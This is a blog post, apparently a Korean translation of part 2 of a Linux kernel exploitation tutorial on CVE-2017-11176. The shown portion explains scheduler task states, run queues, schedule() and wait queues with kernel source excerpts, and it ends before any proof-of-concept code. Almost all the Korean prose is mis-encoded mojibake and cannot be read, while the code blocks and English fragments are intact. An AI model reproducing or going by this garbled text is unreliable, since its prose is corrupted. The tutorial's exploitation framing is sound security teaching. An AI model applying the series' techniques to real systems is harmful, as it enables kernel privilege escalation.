---
layout: single
title:  "CVE-2017-11176: í•œ ê±¸ìŒ í•œ ê±¸ìŒ ë¦¬ëˆ…ìŠ¤ ì»¤ë„ ìµìŠ¤í”Œë¡œì‡í•˜ê¸° (part 2/4)"
date:   2019-08-12 15:36:24 +0900
classes: wide
categories: Security
sidebar: 
    nav: "security"
---
*LEXFOì˜ [CVE-2017-11176: A step-by-step Linux Kernel exploitation (part 2/4)](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html)ë¥¼ ë²ˆì—­í•œ ë¬¸ì„œì…ë‹ˆë‹¤. ë²ˆì—­ì´ ì• ë§¤í•œ ê²½ìš°ì—” ì›ë¬¸ì˜ ë‹¨ì–´ë¥¼ ì˜†ì— ì ì–´ë‘ì—ˆìŠµë‹ˆë‹¤.*

# ì†Œê°œ

[ì´ì „ íŒŒíŠ¸](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca)ì˜ ë‚´ìš©ì€ CVE-2017-11176(aka. "mq\_notify: double sock\_put()")ì— ëŒ€í•œ ìì„¸í•œ ë¶„ì„ê³¼ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ì˜€ë‹¤.

ë²„ê·¸ë¥¼ ê²€ì¦í•˜ê¸° ìœ„í•´ ì»¤ë„ ì˜ì—­ì—ì„œ (System Tapì„ ì´ìš©í•˜ì—¬) ê°•ì œë¡œ íŠ¸ë¦¬ê±°ë¥¼ í–ˆê³ , (ì·¨ì•½í•œ ì½”ë“œì— ë„ë‹¬ë§Œ í•˜ëŠ”) ìµìŠ¤í”Œë¡œì‡ì˜ ì´ˆì•ˆì„ ë§Œë“¤ì—ˆë‹¤.

ì´ ê³¼ì •ì—ì„œ ë²„ê·¸ë¥¼ íŠ¸ë¦¬ê±°í•˜ê¸° ìœ„í•œ ì„¸ ê°€ì§€ ìš”êµ¬ ì¡°ê±´ê³¼ ì¶©ì¡±ì‹œí‚¤ëŠ” ë°©ë²•ì´ ë“œëŸ¬ë‚¬ë‹¤:

1. ê°•ì œë¡œ netlink\_attachskb()ê°€ 1ì„ ë°˜í™˜í•˜ë„ë¡ í•˜ê¸°
2. ìµìŠ¤í”Œë¡œì‡ ìŠ¤ë ˆë“œ unblockí•˜ê¸°
3. ê°•ì œë¡œ ë‘ ë²ˆì§¸ *fget()* í˜¸ì¶œì´ NULLì„ ë°˜í™˜í•˜ë„ë¡ í•˜ê¸°

ì´ë²ˆ íŒŒíŠ¸ì—ì„  System Tap ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì œê±°í•˜ê³  ìœ ì € ì˜ì—­ì˜ ì½”ë“œë§Œ ì‚¬ìš©í•˜ì—¬ ìœ„ ìš”êµ¬ ì¡°ê±´ë“¤ì„ ë§Œì¡±ì‹œí‚¬ ê²ƒì´ë‹¤. ë¬¸ì„œ ë§ˆì§€ë§‰ì—ëŠ” í™•ì‹¤í•˜ê²Œ ë²„ê·¸ë¥¼ íŠ¸ë¦¬ê±°í•˜ëŠ” ì™„ì „í•œ proof-of-concept ì½”ë“œë¥¼ ë§Œë“¤ê²Œ ëœë‹¤.

- - -

# ëª©ì°¨

* [í•µì‹¬ ê°œë… #2](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196#core-concepts)
* [ë©”ì¸ ìŠ¤ë ˆë“œ unblockí•˜ê¸°](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196#unblock-main-thread)
* [ë‘ ë²ˆì§¸ ë£¨í”„ì—ì„œ fget()ì´ ì‹¤íŒ¨í•˜ê²Œ í•˜ê¸°](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196#making-fget-fail-on-second-loop)
* ["retry" labelë¡œ ë˜ëŒì•„ê°€ê¸°](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196#looping-back-to-retry-label)
* [ìµœì¢… Proof-Of-Concept ì½”ë“œ](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196#final-poc-code)
* [ê²°ë¡ ](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196#conclusion)

- - -

# <a name='core-concepts'></a>í•µì‹¬ ê°œë… #2

ë‘ ë²ˆì§¸ "core concepts" ì„¹ì…˜ì€ ìŠ¤ì¼€ì¥´ëŸ¬ í•˜ìœ„ ì‹œìŠ¤í…œ(subsystem)ì— ëŒ€í•´ ì†Œê°œí•œë‹¤. ì²« ì£¼ì•ˆì ì€ taskì˜ ìƒíƒœì™€ taskê°€ ë‹¤ì–‘í•œ ìƒíƒœê°„ì— ì „í™˜ë˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ê²ƒì´ë‹¤. ì‹¤ì œ ìŠ¤ì¼€ì¥´ëŸ¬ ì•Œê³ ë¦¬ì¦˜([Completely Fair Scheduler](https://www.linuxjournal.com/node/10267))ì— ëŒ€í•´ì„  ë‹¤ë£¨ì§€ ì•ŠëŠ”ë‹¤.

ì—¬ê¸°ì„  **wait queues**ê°€ êµ‰ì¥íˆ ì¤‘ìš”í•˜ê²Œ ë‹¤ë¤„ì§„ë‹¤. wait queueëŠ” ì´ë²ˆ íŒŒíŠ¸ì—ì„œ ìŠ¤ë ˆë“œë¥¼ unblockí•˜ëŠ” ë° ì‚¬ìš©ë˜ê³ , ìµìŠ¤í”Œë¡œì‡ ê³¼ì •ì—ì„œ arbitrary call primitiveë¥¼ ì–»ëŠ”(gain) ë°ë„ ì‚¬ìš©ëœë‹¤(part 3 ì°¸ê³ ).

## Task State

taskì˜ *running*  ìƒíƒœëŠ” task\_structì˜ **state** í•„ë“œì— ì €ì¥ëœë‹¤. taskëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ì´ ìƒíƒœë“¤ ì¤‘ í•˜ë‚˜ì´ë‹¤(ìƒíƒœëŠ” ë” ë‹¤ì–‘í•˜ë‹¤):

* **Running**: í”„ë¡œì„¸ìŠ¤ê°€ êµ¬ë™ë˜ëŠ” ì¤‘ì´ê±°ë‚˜ cpuì—ì„œ êµ¬ë™ë˜ê¸¸ ê¸°ë‹¤ë¦¼
* **Waiting**: í”„ë¡œì„¸ìŠ¤ê°€ ì´ë²¤íŠ¸/ìì›ì„ ê¸°ë‹¤ë¦¬ê±°ë‚˜ sleepí•¨

"running" ìƒíƒœì˜ task(*TASK\_RUNNING*)ëŠ” **run queue**ì— ì†í•œ taskì´ë‹¤. cpuì—ì„œ êµ¬ë™ ì¤‘ì´ê±°ë‚˜ ê³§ (ìŠ¤ì¼€ì¥´ëŸ¬ê°€ ì„ íƒí•˜ë©´) êµ¬ë™ëœë‹¤.

"waiting" ìƒíƒœì˜ taskëŠ” ì–´ë–¤ CPUì—ì„œë„ êµ¬ë™ ì¤‘ì´ì§€ ì•Šì€ taskì´ë‹¤. ì´ëŸ° taskëŠ” **wait queues**ë‚˜ ì‹œê·¸ë„ì„ í†µí•´ ê¹¨ì–´ë‚  ìˆ˜ ìˆë‹¤. waiting ì¤‘ì˜ taskë¥¼ ë³´í†µ *TASK\_INTERRUPTIBLE* ì´ë¼ í•œë‹¤(i.e. "sleeping"ë„ interruptë  ìˆ˜ ìˆë‹¤).

ë‹¤ì–‘í•œ taskì˜ ìƒíƒœëŠ” ì—¬ê¸° ì •ì˜ë˜ì–´ ìˆë‹¤:

```c
// [include/linux/sched.h]

#define TASK_RUNNING        0
#define TASK_INTERRUPTIBLE  1
// ... cut (other states) ...
```

state í•„ë“œëŠ” ì§ì ‘ì ìœ¼ë¡œ í˜¹ì€ "current" ë§¤í¬ë¡œë¥¼ ì‚¬ìš©í•˜ëŠ” **\_\_set\_current\_state()** helperë¥¼ í†µí•´ì„œ ë‹¤ë£° ìˆ˜ ìˆë‹¤:

```c
// [include/linux/sched.h]

#define __set_current_state(state_value)            \
    do { current->state = (state_value); } while (0)
```

## Run Queues

**struct rq** (run queue)ëŠ” ìŠ¤ì¼€ì¥´ëŸ¬ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ ë°ì´í„° êµ¬ì¡° ì¤‘ í•˜ë‚˜ì´ë‹¤.  run queueì— ìˆëŠ” ëª¨ë“  taskëŠ” CPUì— ì˜í•´ ì‹¤í–‰ëœë‹¤. ëª¨ë“  CPUëŠ” ê°ìì˜ run queueë¥¼ ê°€ì§€ê³  ìˆì–´ì„œ ì§„ì •í•œ ë©€í‹° íƒœìŠ¤í‚¹ì´ ê°€ëŠ¥í•˜ë‹¤. run queueì—” CPUì—ì„œ ì‹¤í–‰ë˜ë„ë¡ (ìŠ¤ì¼€ì¥´ëŸ¬ì— ì˜í•´) "ì„ íƒë  ìˆ˜ ìˆëŠ”" taskì˜ ëª©ë¡ì´ ë‹´ê²¨ìˆë‹¤. ë˜ ìŠ¤ì¼€ì¥´ëŸ¬ê°€ "ê³µì •í•œ" ì„ íƒì„ í•˜ê¸° ìœ„í•´ ì“°ì´ëŠ” í†µê³„ë¥¼ ê°€ì§€ê³  ìˆìœ¼ë©° ê²°êµ­ì—” ê° cpuê°„ì˜ ë¶€í•˜(load)ë¥¼ ì¬ì¡°ì •í•œë‹¤(= cpu migration).

```c
// [kernel/sched.c]

struct rq {
  unsigned long nr_running;   // <----- statistics
  u64 nr_switches;            // <----- statistics
  struct task_struct *curr;   // <----- the current running task on the cpu
  // ...
};
```

**ë…¸íŠ¸**: "Completely Fair Scheduler (CFS)"ì—ì„  ì‹¤ì œ taskê°€ ì €ì¥ë˜ëŠ” ë°©ì‹ì´ ì•½ê°„ ë³µì¡í•˜ì§€ë§Œ ì—¬ê¸°ì„  ìƒê´€í•˜ì§€ ì•Šì•„ë„ ëœë‹¤.

ê°„ë‹¨í•˜ê²Œ run queueì—ì„œ ë‚˜ê°„ taskëŠ” ë”ì´ìƒ ì‹¤í–‰ë˜ì§€ ì•ŠëŠ”ë‹¤ê³  ìƒê°í•˜ì(= ê·¸ taskë¥¼ ì‹¤í–‰í•  CPUê°€ ì—†ë‹¤). ì´ê²ƒì´ ì •í™•íˆ **deactivate\_task()** í•¨ìˆ˜ê°€ ìˆ˜í–‰í•˜ëŠ” ì¼ì´ë‹¤. ë°˜ëŒ€ë¡œ, **activate\_task()**ê°€ ì •í™•íˆ ë°˜ëŒ€ì˜ ì¼ì„ í•œë‹¤(taskë¥¼ run queueì— ë„£ëŠ”ë‹¤).

## Blocking a task and the schedule() function

taskì˜ ìƒíƒœê°€ runningì—ì„œ waitingìœ¼ë¡œ ì „í™˜ë˜ë ¤ë©´ ë‘ ê°€ì§€ë¥¼ í•´ì•¼ í•œë‹¤:

1. ìì‹ ì˜ *running* ìƒíƒœë¥¼ TASK\_INTERRUPTIBLEë¡œ ì„¤ì •
2. run queueì—ì„œ ë‚˜ê°€ê¸° ìœ„í•´ deactivate\_task() í˜¸ì¶œ

ì‹¤ì œë¡œëŠ” deactive\_task()ë¥¼ ì§ì ‘ì ìœ¼ë¡œ í˜¸ì¶œí•˜ì§€ ì•Šê³  **schedule()**ì„ í˜¸ì¶œí•œë‹¤.

schedule() í•¨ìˆ˜ëŠ” ìŠ¤ì¼€ì¥´ëŸ¬ì˜ ê°€ì¥ ì¤‘ìš”í•œ í•¨ìˆ˜ì´ë‹¤. schedule()ì´ í˜¸ì¶œë˜ë©´ ë‹¤ìŒ (running ìƒíƒœì˜) taskê°€ CPUì—ì„œ êµ¬ë™ë˜ë„ë¡ ì„ íƒë˜ì–´ì•¼ í•œë‹¤. ì¦‰ run queueì˜ **curr** í•„ë“œê°€ ì—…ë°ì´íŠ¸ëœë‹¤.

ê·¸ëŸ¬ë‚˜ í˜„ì¬ task ìƒíƒœê°€ runningì´ ì•„ë‹ˆê³ (= ìƒíƒœê°€ 0ì´ ì•„ë‹˜) ë³´ë¥˜ ì¤‘ì¸(pending) ì‹œê·¸ë„ì´ ì—†ì„ ë•Œ  schedule()ì´ í˜¸ì¶œë˜ë©´ deactivate\_task() í•¨ìˆ˜ê°€ ì‹¤í–‰ëœë‹¤:

```c
      asmlinkage void __sched schedule(void)
      {
        struct task_struct *prev, *next;
        unsigned long *switch_count;
        struct rq *rq;
        int cpu;

          // ... cut ...

        prev = rq->curr;    // <---- "prev" is the task running on the current CPU

        if (prev->state && !(preempt_count() & PREEMPT_ACTIVE)) {   // <----- ignore the "preempt" stuff
          if (unlikely(signal_pending_state(prev->state, prev)))
            prev->state = TASK_RUNNING;
          else
            deactivate_task(rq, prev, DEQUEUE_SLEEP);     // <----- task is moved out of run queue
          switch_count = &prev->nvcsw;
        }

        // ... cut (choose the next task) ...
      }
```

ë§ˆì§€ë§‰ìœ¼ë¡œ ë‹¤ìŒ ì ˆì°¨ë¥¼ í†µí•´ taskê°€ blockë  ìˆ˜ ìˆë‹¤.

```c
void make_it_block(void)
{
  __set_current_state(TASK_INTERRUPTIBLE);
  schedule();
}
```

taskëŠ” *ë‹¤ë¥¸ ë¬´ì–¸ê°€* ê°€ ê¹¨ì›Œì¤„ ë•Œê¹Œì§€ blockëœ ìƒíƒœë¡œ ìˆëŠ”ë‹¤.

## Wait Queues

ìì›ì´ë‚˜ íŠ¹ìˆ˜í•œ ì´ë²¤íŠ¸ë¥¼ ê¸°ë‹¤ë¦¬ëŠ” ê²ƒì€ ì•„ì£¼ í”í•œ ì¼ì´ë‹¤. ì˜ˆë¥¼ ë“¤ì–´ ì„œë²„ë¥¼ êµ¬ë™í•˜ë©´, ì„œë²„ì˜ ë©”ì¸ ìŠ¤ë ˆë“œëŠ” ì ‘ì†ì´ ì˜¤ê¸¸ ê¸°ë‹¤ë¦°ë‹¤. "non blocking"ìœ¼ë¡œ ë§ˆí‚¹ëœ(marked as) ê²½ìš°ê°€ ì•„ë‹ˆë¼ë©´ accept() syscallì´ ë©”ì¸ ìŠ¤ë ˆë“œë¥¼ blockí•  ê²ƒì´ë‹¤. ì¦‰ ë©”ì¸ ìŠ¤ë ˆë“œëŠ” *ë‹¤ë¥¸ ë¬´ì–¸ê°€* ê°€ ê¹¨ì›Œì¤„ ë•Œê¹Œì§€ ì»¤ë„ ì˜ì—­ì— ê°‡í˜€ ìˆëŠ”ë‹¤.

**wait queue**ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ í˜„ì¬ blockëœ(waiting ìƒíƒœì¸) í”„ë¡œì„¸ìŠ¤ë“¤ì˜ ì´ì¤‘ ì—°ê²° ë¦¬ìŠ¤íŠ¸ì´ë‹¤. run queueì˜ "ë°˜ëŒ€" ê°œë…ìœ¼ë¡œ ë³´ì´ê¸°ë„ í•œë‹¤. queue ìì²´ëŠ” **wait\_queue\_head\_t**ë¡œ ë‚˜íƒ€ë‚¸ë‹¤(represent).

```c
// [include/linux/wait.h]

typedef struct __wait_queue_head wait_queue_head_t;

struct __wait_queue_head {
    spinlock_t lock;
    struct list_head task_list;
};
```

**ë…¸íŠ¸**: ë¦¬ëˆ…ìŠ¤ëŠ” ì´ì¤‘ ì—°ê²° ë¦¬ìŠ¤íŠ¸ë¥¼ **struct list\_head** íƒ€ì…ìœ¼ë¡œ êµ¬í˜„í•œë‹¤.

wait queueì— ìˆëŠ” ê°ê°ì˜ ìš”ì†ŒëŠ” **wait\_queue\_t** íƒ€ì…ì´ë‹¤:

```c
// [include/linux.wait.h]

typedef struct __wait_queue wait_queue_t;
typedef int (*wait_queue_func_t)(wait_queue_t *wait, unsigned mode, int flags, void *key);

struct __wait_queue {
    unsigned int flags;
    void *private;                
    wait_queue_func_t func;     // <----- we will get back to this
    struct list_head task_list;
};
```

wait queue ìš”ì†ŒëŠ” **DECLARE\_WAITQUEUE()** ë§¤í¬ë¡œë¥¼ ì´ìš©í•˜ì—¬ ìƒì„±ë  ìˆ˜ ìˆë‹¤.

```c
// [include/linux/wait.h]

#define __WAITQUEUE_INITIALIZER(name, tsk) {                \
    .private    = tsk,                      \
    .func       = default_wake_function,            \
    .task_list  = { NULL, NULL } }

#define DECLARE_WAITQUEUE(name, tsk)                    \
    wait_queue_t name = __WAITQUEUE_INITIALIZER(name, tsk) // <----- it creates a variable!
```

ê·¸ë¦¬ê³  ì´ ë§¤í¬ë¡œëŠ” ì´ëŸ° ì‹ìœ¼ë¡œ ì‚¬ìš©ëœë‹¤:

```c
DECLARE_WAITQUEUE(my_wait_queue_elt, current); // <----- use the "current" macro
```

ë§ˆì§€ë§‰ìœ¼ë¡œ, wait queue ìš”ì†Œê°€ ì„ ì–¸ë˜ë©´ **add\_wait\_queue()** í•¨ìˆ˜ë¥¼ í†µí•´ wait queueì— ë“¤ì–´ê°„ë‹¤. ì´ í•¨ìˆ˜ëŠ” ì ì ˆí•œ *locking* (ì§€ê¸ˆì€ ì‹ ê²½ì“°ì§€ ì•Šì•„ë„ ëœë‹¤)ê³¼ í•¨ê»˜ ìš”ì†Œë¥¼ ì´ì¤‘ ì—°ê²° ë¦¬ìŠ¤íŠ¸ì— ì¶”ê°€í•œë‹¤.

```c
// [kernel/wait.c]

void add_wait_queue(wait_queue_head_t *q, wait_queue_t *wait)
{
    unsigned long flags;

    wait->flags &= ~WQ_FLAG_EXCLUSIVE;
    spin_lock_irqsave(&q->lock, flags);
    __add_wait_queue(q, wait);              // <----- here
    spin_unlock_irqrestore(&q->lock, flags);
}

static inline void __add_wait_queue(wait_queue_head_t *head, wait_queue_t *new)
{
    list_add(&new->task_list, &head->task_list);
}
```

**add\_wait\_queue()**ë¥¼ ì‹¤í–‰í•˜ëŠ” ê²ƒì„ "wait queueì— ë“±ë¡í•œë‹¤"ë¼ê³  ë¶€ë¥´ê¸°ë„ í•œë‹¤.

## Waking up a task

ì§€ê¸ˆê¹Œì§€ run queueì™€ wait queueë¼ëŠ” ë‘ ì¢…ë¥˜ì˜ queueê°€ ìˆìŒì„ ì•Œê²Œ ë˜ì—ˆë‹¤. taskë¥¼ blockí•œë‹¤ëŠ” ê²ƒì€ ê·¸ëƒ¥ taskë¥¼ run queueì—ì„œ (deactivate\_task()ë¥¼ ì´ìš©í•˜ì—¬) ì œê±°í•˜ëŠ” ê²ƒì´ì—ˆë‹¤. ê·¸ë ‡ë‹¤ë©´ blockëœ(sleeping) ìƒíƒœì—ì„œ running ìƒíƒœë¡œëŠ” ì–´ë–»ê²Œ ì „í™˜ë ê¹Œ?

**ë…¸íŠ¸**: blockëœ taskëŠ” ì‹œê·¸ë„(ì´ë‚˜ ë‹¤ë¥¸ ìˆ˜ë‹¨)ì„ í†µí•´ì„œë„ ê¹¨ìš¸ ìˆ˜ ìˆì§€ë§Œ ì—¬ê¸°ì„  ì£¼ì œë¥¼ ë²—ì–´ë‚˜ëŠ” ë‚´ìš©ì´ë‹¤.

blockëœ taskëŠ” êµ¬ë™ ì¤‘ì´ ì•„ë‹ˆë¯€ë¡œ **ìê¸° ìì‹ ì„ ê¹¨ìš¸ ìˆ˜ëŠ” ì—†ë‹¤**. **ë‹¤ë¥¸ task**ê°€ ê¹¨ì›Œì£¼ì–´ì•¼ í•œë‹¤.

íŠ¹ì • ìì›ì„ ê°€ì§€ê³  ìˆëŠ” ë°ì´í„° êµ¬ì¡°ë“¤ì€ wait queueë¥¼ ê°€ì§„ë‹¤. taskê°€ ìì›ì„ ì‚¬ìš©í•˜ê³  ì‹¶ì€ë° ê·¸ ìˆœê°„ì— ì‚¬ìš©í•  ìˆ˜ ì—†ëŠ” ê²½ìš°, taskëŠ” ìê¸° ìì‹ ì„ sleeping ìƒíƒœë¡œ ë†“ê³  ìì›ì˜ ì†Œìœ ìê°€ ê¹¨ì›Œì£¼ê¸°ë¥¼ ê¸°ë‹¤ë¦°ë‹¤.

ìì›ì„ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ ë˜ì—ˆì„ ë•Œ ê¹¨ê¸° ìœ„í•´ì„  ê·¸ ìì›ì˜ wait queueì— ë“±ë¡ì´ ë˜ì–´ ìˆì–´ì•¼ í•œë‹¤. ì•ì„œ ë´¤ë“¯ì´ ì´ëŸ° "ë“±ë¡"ì€ **add\_wait\_queue()**ë¥¼ í˜¸ì¶œí•˜ì—¬ ì´ë¤„ì§„ë‹¤.

ìì›ì´ ì‚¬ìš© ê°€ëŠ¥í•´ì§€ë©´ ìì›ì˜ ì†Œìœ ìëŠ” í•˜ë‚˜ í˜¹ì€ ì—¬ëŸ¬ taskë¥¼ ê¹¨ì›Œ ì´ì–´ì„œ ì‹¤í–‰ì´ ë˜ê²Œë” í•œë‹¤. ì´ëŠ” **\_\_wake\_up()** í•¨ìˆ˜ë¥¼ í†µí•´ ì´ë¤„ì§„ë‹¤:

```c
// [kernel/sched.c]

/**
 * __wake_up - wake up threads blocked on a waitqueue.
 * @q: the waitqueue
 * @mode: which threads
 * @nr_exclusive: how many wake-one or wake-many threads to wake up
 * @key: is directly passed to the wakeup function
 *
 * It may be assumed that this function implies a write memory barrier before
 * changing the task state if and only if any tasks are woken up.
 */

void __wake_up(wait_queue_head_t *q, unsigned int mode,
            int nr_exclusive, void *key)
{
    unsigned long flags;

    spin_lock_irqsave(&q->lock, flags);
    __wake_up_common(q, mode, nr_exclusive, 0, key);    // <----- here
    spin_unlock_irqrestore(&q->lock, flags);
}
```

```c
    // [kernel/sched.c]

    static void __wake_up_common(wait_queue_head_t *q, unsigned int mode,
          int nr_exclusive, int wake_flags, void *key)
    {
      wait_queue_t *curr, *next;

[0]   list_for_each_entry_safe(curr, next, &q->task_list, task_list) {
        unsigned flags = curr->flags;

[1]     if (curr->func(curr, mode, wake_flags, key) &&
            (flags & WQ_FLAG_EXCLUSIVE) && !--nr_exclusive)
          break;
      }
    }
```

ì´ í•¨ìˆ˜ëŠ” wait queueì˜ ëª¨ë“  ìš”ì†Œì— ëŒ€í•´ ë°˜ë³µëœë‹¤ [0] (**list\_for\_each\_entry\_safe()**ëŠ” ì´ì¤‘ ì—°ê²° ë¦¬ìŠ¤íŠ¸ì—ì„œ í”íˆ ì“°ì´ëŠ” ë§¤í¬ë¡œë‹¤). ê°ê°ì˜ ìš”ì†Œì— ëŒ€í•´ **func()** ì½œë°±ì´ ì‹¤í–‰ëœë‹¤ [1].

DECLARE\_WAITQUEUE() ë§¤í¬ë¡œê°€ ê¸°ì–µë‚˜ëŠ”ê°€? ì´ ë§¤í¬ë¡œëŠ” func ì½œë°±ì„ **default\_wake\_function**ìœ¼ë¡œ ì„¤ì •í•œë‹¤:

```c
// [include/linux/wait.h]

#define __WAITQUEUE_INITIALIZER(name, tsk) {                \
    .private    = tsk,                      \
    .func       = default_wake_function,            \                 // <------
    .task_list  = { NULL, NULL } }

#define DECLARE_WAITQUEUE(name, tsk)                    \
    wait_queue_t name = __WAITQUEUE_INITIALIZER(name, tsk)
```

ì°¨ë¡€ì°¨ë¡€, default\_wake\_function()ì€ wait queue ìš”ì†Œì˜ **private** í•„ë“œ(ëŒ€ë¶€ë¶„ì˜ ì‹œê°„ë™ì•ˆ sleeping ìƒíƒœì¸ taskì˜ *task\_struct* ë¥¼ ê°€ë¦¬í‚´)ë¥¼ ì´ìš©í•˜ì—¬ **try\_to\_wake\_up()** ì„ í˜¸ì¶œí•œë‹¤:

```c
int default_wake_function(wait_queue_t *curr, unsigned mode, int wake_flags,
              void *key)
{
    return try_to_wake_up(curr->private, mode, wake_flags);
}
```

ë§ˆì§€ë§‰ìœ¼ë¡œ, try\_to\_wake\_up()ì€ schedule()ì˜ "ë°˜ëŒ€" ê°œë…ê°™ì€ ê²ƒì´ë‹¤. schedule()ì´ í˜„ì¬ taskë¥¼ "ìŠ¤ì¼€ì¥´ì—ì„œ ì œì™¸"í•œë‹¤ë©´, try\_to\_wake\_up()ì€ taskê°€ ë‹¤ì‹œ ìŠ¤ì¼€ì¥´ì— ë“¤ì–´ê°ˆ ìˆ˜ ìˆê²Œ í•œë‹¤. ì¦‰ taskë¥¼ run queueì— ë„£ê³  running ìƒíƒœë¡œ ë°”ê¾¸ëŠ” ê²ƒì´ë‹¤!

```c
static int try_to_wake_up(struct task_struct *p, unsigned int state,
              int wake_flags)
{
    struct rq *rq;

    // ... cut (find the appropriate run queue) ...

out_activate:
    schedstat_inc(p, se.nr_wakeups);              // <----- update some stats
    if (wake_flags & WF_SYNC)
        schedstat_inc(p, se.nr_wakeups_sync);
    if (orig_cpu != cpu)
        schedstat_inc(p, se.nr_wakeups_migrate);
    if (cpu == this_cpu)
        schedstat_inc(p, se.nr_wakeups_local);
    else
        schedstat_inc(p, se.nr_wakeups_remote);
    activate_task(rq, p, en_flags);               // <----- put it back to run queue!
    success = 1;

    p->state = TASK_RUNNING;                      // <----- the state has changed!

    // ... cut ...
}
```

ì—¬ê¸°ì„œ **activate\_task()**ê°€ ì‹¤í–‰ëœë‹¤(ì‹¤í–‰ë˜ëŠ” ë‹¤ë¥¸ ê³³ë„ ìˆë‹¤). taskê°€ ë‹¤ì‹œ run queueë¡œ ëŒì•„ì™”ê³  **ë™ì‹œì—** TASK\_RUNNING ìƒíƒœì´ê¸° ë•Œë¬¸ì— ìŠ¤ì¼€ì¥´ì— ë“¤ì–´ê°ˆ ê¸°íšŒê°€ ìƒê²¼ë‹¤. ê·¸ëŸ¬ë¯€ë¡œ schedule() í˜¸ì¶œ ì´í›„ ë¶€ë¶„ì—ì„œ ì‹¤í–‰ì„ ì´ì–´ë‚˜ê°„ë‹¤.

ì‹¤ì œë¡œ \_\_wake\_up()ì€ ë°”ë¡œ í˜¸ì¶œë˜ì§€ ì•ŠëŠ”ë‹¤. ëŒ€ì‹  ì‹¤í–‰ë˜ëŠ” helper ë§¤í¬ë¡œê°€ ìˆë‹¤:

```c
// [include/linux/wait.h]

#define wake_up(x)          __wake_up(x, TASK_NORMAL, 1, NULL)
#define wake_up_nr(x, nr)       __wake_up(x, TASK_NORMAL, nr, NULL)
#define wake_up_all(x)          __wake_up(x, TASK_NORMAL, 0, NULL)

#define wake_up_interruptible(x)    __wake_up(x, TASK_INTERRUPTIBLE, 1, NULL)
#define wake_up_interruptible_nr(x, nr) __wake_up(x, TASK_INTERRUPTIBLE, nr, NULL)
#define wake_up_interruptible_all(x)    __wake_up(x, TASK_INTERRUPTIBLE, 0, NULL)
```

## A Complete Example

ì•ì„œ ë§í•œ ê°œë…ì„ ìš”ì•½í•˜ëŠ” ê°„ë‹¨í•œ ì˜ˆì‹œê°€ ìˆë‹¤:

```c
struct resource_a {
  bool resource_is_ready;
  wait_queue_head_t wq;
};

void task_0_wants_resource_a(struct resource_a *res)
{
  if (!res->resource_is_ready) {
    // "register" to be woken up
    DECLARE_WAITQUEUE(task0_wait_element, current);
    add_wait_queue(&res->wq, &task0_wait_element);

    // start sleeping
    __set_current_state(TASK_INTERRUPTIBLE);
    schedule();

    // We'll restart HERE once woken up
    // Remember to "unregister" from wait queue
  }

  // XXX: ... do something with the resource ...
}

void task_1_makes_resource_available(struct resource_a *res)
{
  res->resource_is_ready = true;
  wake_up_interruptible_all(&res->wq);  // <--- unblock "task 0"
}
```

í•œ ìŠ¤ë ˆë“œê°€ *task\_0\_wants\_resource\_a()* í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ê³  ì‚¬ìš© ê°€ëŠ¥í•œ "ìì›"ì´ ì—†ì–´ blockëœë‹¤. ì ì ˆí•œ ì‹œì ì— ìì› ì†Œìœ ìëŠ” (ë‹¤ë¥¸ ìŠ¤ë ˆë“œì—ì„œ) ìì›ì´ ì‚¬ìš© ê°€ëŠ¥í•˜ê²Œ ë§Œë“¤ê³  *task\_1\_makes\_resource\_available()* ì„ í˜¸ì¶œí•œë‹¤. ì´í›„ì— task\_0\_wants\_resource\_a()ì˜ ì‹¤í–‰ì´ ì¬ê°œë  ìˆ˜ ìˆë‹¤.

ë¦¬ëˆ…ìŠ¤ ì»¤ë„ ì½”ë“œì—ì„œ ì´ëŸ° íŒ¨í„´ì„ ìì£¼ ë³´ê²Œ ë  ê²ƒì´ë‹¤. ì´ì œ ë¬´ìŠ¨ ì˜ë¯¸ì¸ì§€ ì•Œê²Œ ë˜ì—ˆë‹¤. "ìì›"ì´ë¼ëŠ” í‘œí˜„ì´ ì—¬ê¸°ì„œ í¬ê´„ì ìœ¼ë¡œ ì‚¬ìš©ë˜ì—ˆë‹¤ëŠ” ì ì„ ì£¼ëª©í•˜ì. taskë“¤ì€ ì´ë²¤íŠ¸, ì¡°ê±´ì´ ì°¸ì´ ë˜ëŠ” ê²ƒì´ë‚˜ ë‹¤ë¥¸ ê²ƒë“¤ì„ ê¸°ë‹¤ë¦´ ìˆ˜ ìˆë‹¤. "block"ëœ syscallì„ ë³´ê²Œ ë˜ë©´ wait queueê°€ ë©€ì§€ ì•Šì€ ê³³ì— ìˆì„ ê²ƒì´ë‹¤ğŸ˜Š.

ì´ì œ ë‹¤ìŒìœ¼ë¡œ ë„˜ì–´ê°€ì„œ proof-of-concept êµ¬í˜„ì„ ì‹œì‘í•´ë³´ì.

- - -

# <a name='unblock-main-thread'></a>ë©”ì¸ ìŠ¤ë ˆë“œ unblockí•˜ê¸°

